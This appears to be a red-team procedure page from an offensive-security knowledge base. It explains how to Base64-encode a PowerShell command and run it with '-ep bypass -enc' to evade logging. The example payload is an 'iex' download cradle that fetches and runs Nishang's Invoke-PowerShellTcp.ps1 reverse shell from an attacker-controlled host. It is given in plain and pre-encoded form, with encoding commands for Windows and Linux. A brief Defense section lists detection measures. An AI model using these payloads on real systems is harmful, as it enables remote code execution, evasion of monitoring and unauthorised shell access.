---
id: f55266ec-412f-4e32-a93a-6b86033a5772
name: Encode-and-Execute-Base64-PowerShell-Command
type: procedure
verified: true
submitted: false
created_at: '2019-11-13T23:17:33.099017+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter/T1059.001 -
    PowerShell|T1059.001 - PowerShell]]
sub_techniques: []
tags:
  - '[[tags/encode]]'
  - '[[tags/powershell]]'
  - '[[tags/execution]]'
commands:
  - '[[commands/iconv-encode-string-utf16-base64]]'
  - '[[commands/powershell-base64-encode-string]]'
  - '[[commands/powershell-execute-base64-encoded-command]]'
platforms:
  - Windows
tools: []
validated: true
---

# Encode-and-Execute-Base64-PowerShell-Command

## Summary

This procedure demonstrates how to encode a PowerShell command or script in Base64 format to bypass character restrictions, quotation mark issues, and basic command-line logging, then execute it on a Windows target. It is commonly used for obfuscating payloads during execution in red team operations or penetration testing to evade detection.

## Description

PowerShell supports Base64 encoding for commands, allowing attackers to deliver complex scripts without dealing with escaping quotes or special characters. This technique is particularly useful for downloading and executing remote scripts, such as reverse shells, while minimizing the footprint in process arguments. The procedure covers encoding on both Windows (using native PowerShell) and Linux (using iconv for UTF-16 conversion followed by Base64), ensuring compatibility since PowerShell uses UTF-16 internally. Once encoded, the payload can be executed via the `-enc` flag, bypassing execution policy with `-ep bypass`. This maps to MITRE ATT&CK Execution tactic via PowerShell interpreter sub-technique, often in scenarios involving initial access or lateral movement where direct command execution might be logged or blocked.

## Requirements

1. Access to a system with PowerShell (Windows target) or bash with iconv and base64 (Linux encoding host).
2. The payload string to encode, such as a download cradle for a remote script (e.g., Nishang's Invoke-PowerShellTcp.ps1).
3. Network access to the remote script location if downloading.
4. Administrative or user-level access on the target for execution, depending on the payload.

## Defense

Defensive measures and detection strategies:

- Enable PowerShell logging (Module, Script Block, and Transcription) to capture decoded commands.
- Monitor for `powershell.exe` invocations with `-enc` or `-ep bypass` flags using EDR tools like Sysmon or Windows Defender.
- Block or inspect Base64-encoded strings in command lines via regex patterns in SIEM rules.
- Restrict PowerShell execution policy to AllSigned or Restricted on endpoints.
- Network monitoring for unusual downloads from external IPs to PowerShell scripts.

## Objectives

1. Obfuscate a PowerShell payload to evade basic detection and logging.
2. Encode the payload in Base64 format compatible with PowerShell's UTF-16 requirements.
3. Execute the encoded payload on a Windows target to achieve code execution, such as spawning a reverse shell.
4. Verify successful execution through command output or connection callbacks.

## Instructions

### Step 1: Prepare the Payload Script

**Context**: Define the PowerShell command or script to encode. This example uses a download cradle to fetch and execute Nishang's Invoke-PowerShellTcp.ps1 reverse shell script from a remote server. Replace the URL with your controlled host.

**Code** ([[codes/powershell-download-and-execute-remote-script]]):

```powershell
iex (New-Object Net.WebClient).downloadString('http://$_TARGET_IP/Invoke-PowerShellTcp.ps1')
```

> This code downloads the script and invokes it using IEX. Set $_TARGET_IP to your attacker's IP hosting the script. Expected output: The script executes, potentially establishing a reverse shell if a listener is active.

### Step 2: Encode Payload on Windows

**Context**: Use native PowerShell to encode the payload string into UTF-16 bytes and then Base64. This ensures compatibility with PowerShell's string handling on Windows targets.

**Command** ([[commands/powershell-base64-encode-string]]):

```powershell
$Text = "$_PAYLOAD"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText=[Convert]::ToBase64String($Bytes)
$EncodedText
```

> Replace $_PAYLOAD with your script string, e.g., "iex (New-Object Net.WebClient).downloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')". This step converts the string to Unicode bytes and Base64-encodes them. Expected output: A Base64 string like "aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAJwApAA==".

### Step 3: Encode Payload on Linux (Alternative)

**Context**: If encoding from a Linux host, convert the string to UTF-16LE first (to match PowerShell's encoding), then apply Base64. This is necessary because Linux defaults to UTF-8.

**Command** ([[commands/iconv-encode-string-utf16-base64]]):

```bash
echo -n "$_PAYLOAD" | iconv -t utf-16le | base64 -w 0
```

> Replace $_PAYLOAD with your script string. The `-n` flag suppresses newlines, `-t utf-16le` converts to little-endian UTF-16, and `-w 0` prevents line wrapping. Expected output: A Base64 string like "aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADUANgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=".

### Step 4: Execute the Encoded Payload

**Context**: On the Windows target, run PowerShell with the encoded string to bypass execution policy and execute the decoded command. This spawns a new PowerShell instance.

**Command** ([[commands/powershell-execute-base64-encoded-command]]):

```powershell
powershell -ep bypass -enc $_PAYLOAD.b64
```

> Replace $_PAYLOAD.b64 with the Base64-encoded string from Step 2 or 3. The `-ep bypass` flag ignores execution policy, and `-enc` decodes and runs the payload. Expected output: The decoded script executes; for the example, it downloads and runs the remote script, potentially connecting back to your listener.

> If the payload succeeds, monitor for a reverse shell connection or other indicators like file downloads.
